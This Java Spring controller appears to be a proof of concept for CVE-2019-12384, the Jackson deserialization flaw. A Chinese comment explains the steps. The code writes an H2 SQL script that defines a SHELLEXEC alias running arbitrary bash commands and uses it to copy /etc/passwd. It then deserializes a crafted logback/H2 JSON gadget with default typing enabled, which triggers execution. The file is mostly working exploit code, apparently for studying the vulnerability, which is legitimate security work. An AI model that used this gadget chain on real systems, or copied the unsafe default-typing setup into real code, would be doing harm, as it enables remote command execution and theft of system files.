package myapp;


import org.springframework.web.bind.annotation.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.FileWriter;


@RestController
public class JacksonDatabindController {


    @GetMapping("/CVE-2019-12384")
    public String CVE_2019_12384() {
        try {
            Poc.run();
            return "jackson CVE test completed";
        } catch (Exception e) {
            return "Error during CVE test: " + e.getMessage();
        }
    }

    static class Poc {
        public static void writeSQL() throws Exception {
            String sql = "CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {" +
                    "String[] command = {\"bash\", \"-c\", cmd};" +
                    "java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\");" +
                    "return s.hasNext() ? s.next() : \"\";  }" +
                    "$$;" +
                    "\n\nCALL SHELLEXEC('cp /etc/passwd /tmp');";
            FileWriter fw = new FileWriter("/tmp/inject.sql");
            fw.write(sql);
            fw.close();
        }

        public static void run() throws Exception {
            Class.forName("org.h2.Driver").newInstance();
            writeSQL();
            String jsonStr = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '/tmp/inject.sql'\"}]";
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
            mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
            Object obj = mapper.readValue(jsonStr, Object.class);
            System.out.println("Object has been deserialized");
            System.out.println("Serialized object: " + mapper.writeValueAsString(obj));
        }
    }

    /*
1. 写入SQL脚本
首先，Poc.writeSQL() 方法创建了一个SQL脚本文件（/tmp/inject.sql），该脚本包含了创建一个名为SHELLEXEC的别名，这个别名实际上是一个Java函数，允许执行任意命令。具体的命令是复制/etc/passwd文件到/tmp目录。这个步骤准备了后续利用H2数据库执行任意Java代码的基础。

2. 利用Jackson反序列化触发代码执行
在Poc.run() 方法中，使用Jackson的ObjectMapper来反序列化一个特制的JSON字符串。这个字符串表示一个数组，其第一个元素是ch.qos.logback.core.db.DriverManagerConnectionSource类的名称，第二个元素是一个包含数据库URL的对象。这个URL不是普通的数据库连接字符串，而是一个经过精心构造的字符串，它会触发H2数据库的INIT运行，从指定的脚本文件（上一步创建的/tmp/inject.sql）执行SQL命令。

通过"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '/tmp/inject.sql'"这个数据库URL，Jackson反序列化过程中会尝试连接到H2数据库，并根据URL中的INIT参数执行SQL脚本。这个过程实际上导致了SHELLEXEC函数的创建并执行了内置的命令，即复制/etc/passwd到/tmp。

    * */


}
